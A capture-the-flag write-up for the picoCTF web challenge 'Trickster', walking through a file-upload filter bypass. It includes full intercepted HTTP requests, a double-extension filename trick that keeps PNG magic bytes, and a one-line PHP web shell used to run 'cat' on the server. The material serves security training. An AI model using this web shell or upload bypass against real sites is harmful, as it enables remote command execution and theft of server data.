# Challange Info

Name : Trickster

Difficulty : Medium

Category : Web Exploitation

Link : https://play.picoctf.org/practice/challenge/445?category=1&page=2

# Writeup

Navigating the webapp http://atlas.picoctf.net:52670/.

The wepapp provides file upload functionality.

Intercepting the file upload request after providing valid png file.

```
POST / HTTP/1.1

Host: atlas.picoctf.net:52670

Content-Length: 1621835

Cache-Control: max-age=0

Origin: http://atlas.picoctf.net:52670

Content-Type: multipart/form-data; boundary=----WebKitFormBoundary2BkeBqtFYUCMEiB7

Upgrade-Insecure-Requests: 1

User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

Referer: http://atlas.picoctf.net:52670/

Accept-Encoding: gzip, deflate, br

Accept-Language: en-US,en;q=0.9

sec-gpc: 1

Connection: keep-alive



------WebKitFormBoundary2BkeBqtFYUCMEiB7

Content-Disposition: form-data; name="file"; filename="test.png"

Content-Type: image/png



PNG

<First line of png header>
```

Changing `filename="test.png` to `filename="test.png.php`.

And remove all png data after first line of png header as the server checks for php header after file is uploaded.

After all changes the request should look like this.

```
POST / HTTP/1.1

Host: atlas.picoctf.net:52712

Content-Length: 869

Cache-Control: max-age=0

Origin: http://atlas.picoctf.net:52712

Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryrnVv0sWMNLhWGIPR

Upgrade-Insecure-Requests: 1

User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

Referer: http://atlas.picoctf.net:52712/

Accept-Encoding: gzip, deflate, br

Accept-Language: en-US,en;q=0.9

sec-gpc: 1

Connection: keep-alive



------WebKitFormBoundaryrnVv0sWMNLhWGIPR

Content-Disposition: form-data; name="file"; filename="pay.png.php"

Content-Type: image/png



PNG

<First line of png header>
<?php system($_GET['cmd'], $retval); echo $retval; ?>
------WebKitFormBoundaryrnVv0sWMNLhWGIPR--
```

Forward this request and file will be uploaded.

Now navigate to http://atlas.picoctf.net:52670/uploads/pay.png.php?cmd=cat /var/www/html/GQ4DOOBVMMYGK.txt

`Note : I found "/var/www/html/GQ4DOOBVMMYGK.txt" by using "find / flag" command which revealed all files and to the very end this file caught my eye.`

This will reveal the flag.
